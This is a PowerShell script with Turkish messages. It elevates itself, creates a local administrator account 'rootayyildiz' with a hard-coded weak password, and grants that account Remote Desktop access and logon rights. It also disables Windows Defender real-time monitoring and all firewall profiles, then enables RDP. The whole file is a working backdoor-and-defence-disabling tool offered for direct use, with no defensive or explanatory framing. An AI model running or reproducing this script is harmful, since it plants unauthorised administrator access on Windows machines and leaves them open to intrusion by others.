function Start-AdminShell {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "Yönetici yetkileri olmadan çalışıyorsunuz. Yönetici olarak yeniden başlatılıyor..." -ForegroundColor Yellow
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }
}

function Check-Admin {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if (-not $isAdmin) {
        Write-Host "Bu scripti çalıştırmak için yönetici yetkilerine sahip olmalısınız!" -ForegroundColor Red
        exit
    }
}

function Get-LocalIPAddress {
    $ip = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress
    return $ip
}

function Check-UserExists {
    param([string]$Username)
    $user = Get-LocalUser -Name $Username -ErrorAction SilentlyContinue
    if ($user) {
        return $true
    }
    else {
        return $false
    }
}

function Add-NewUser {
    param([string]$Username, [string]$Password)
    if (Check-UserExists -Username $Username) {
        Write-Host "$Username adlı kullanıcı zaten mevcut!" -ForegroundColor Yellow
    } else {
        $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
        New-LocalUser -Name $Username -Password $SecurePassword -FullName "$Username Fullname" -Description "Yeni Yönetici Kullanıcı"
        Write-Host "$Username adlı kullanıcı başarıyla eklendi." -ForegroundColor Green
    }
}

function Add-UserToAdminGroup {
    param([string]$Username)
    if (Check-UserExists -Username $Username) {
        Add-LocalGroupMember -Group "Administrators" -Member $Username
        Write-Host "$Username yönetici grubuna eklendi." -ForegroundColor Green
    } else {
        Write-Host "Kullanıcı bulunamadı: $Username" -ForegroundColor Red
    }
}

function Add-UserToRemoteDesktopGroup {
    param([string]$Username)
    if (Check-UserExists -Username $Username) {
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $Username
        Write-Host "$Username Remote Desktop Users grubuna eklendi." -ForegroundColor Green
    } else {
        Write-Host "Kullanıcı bulunamadı: $Username" -ForegroundColor Red
    }
}

function Grant-RDPLogonRights {
    param([string]$Username)
    $sid = (New-Object System.Security.Principal.NTAccount($Username)).Translate([System.Security.Principal.SecurityIdentifier]).Value

    $pol = [ADSI]"WinNT://$env:COMPUTERNAME,computer"
    $pol.psbase.children.find("RemoteInteractiveLogon").add("WinNT://$env:COMPUTERNAME/$Username,user")
    Write-Host "$Username kullanıcısına Remote Desktop logon izni verildi." -ForegroundColor Green

    $secPolCmd = "secedit /export /cfg C:\Windows\Temp\secpol.cfg"
    $grantRightCmd = "echo SeRemoteInteractiveLogonRight = *$sid >> C:\Windows\Temp\secpol.cfg"
    $applySecPolCmd = "secedit /configure /db C:\Windows\Temp\secedit.sdb /cfg C:\Windows\Temp\secpol.cfg /areas USER_RIGHTS"

    Write-Host "Remote Desktop yetkisi ayarlanıyor..."
    Invoke-Expression $secPolCmd
    Invoke-Expression $grantRightCmd
    Invoke-Expression $applySecPolCmd

    Write-Host "$Username kullanıcısına başarılı bir şekilde Remote Desktop logon yetkisi verildi." -ForegroundColor Green
}

function Apply-GroupPolicyFix {
    Write-Host "Group Policy ayarları yapılandırılıyor..."
    $GPOPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
    if (-not (Test-Path $GPOPath)) {
        New-Item -Path $GPOPath
    }
    Set-ItemProperty -Path $GPOPath -Name "fDenyTSConnections" -Value 0
    gpupdate /force
    Write-Host "Group Policy başarıyla güncellendi." -ForegroundColor Green
}

function Disable-WindowsDefender {
    Write-Host "Windows Defender devre dışı bırakılıyor..."
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "Windows Defender başarıyla devre dışı bırakıldı." -ForegroundColor Green
}

function Disable-WindowsFirewall {
    Write-Host "Güvenlik duvarı devre dışı bırakılıyor..."
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "Güvenlik duvarı başarıyla devre dışı bırakıldı." -ForegroundColor Green
}

function Enable-RDP {
    Write-Host "Uzak Masaüstü etkinleştiriliyor..."
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Write-Host "Uzak Masaüstü başarıyla etkinleştirildi." -ForegroundColor Green
}

Start-AdminShell  

$Username = "rootayyildiz"
$Password = "123456!'^+%&/"

Add-NewUser -Username $Username -Password $Password
Add-UserToAdminGroup -Username $Username
Add-UserToRemoteDesktopGroup -Username $Username
Grant-RDPLogonRights -Username $Username

Disable-WindowsDefender
Disable-WindowsFirewall

Enable-RDP

Apply-GroupPolicyFix

# Sunucu IP'sini al ve göster
$ServerIP = Get-LocalIPAddress
Write-Host "Sunucu IP Adresi: $ServerIP"

Start-Process "mstsc" -ArgumentList "/v:$ServerIP /admin"
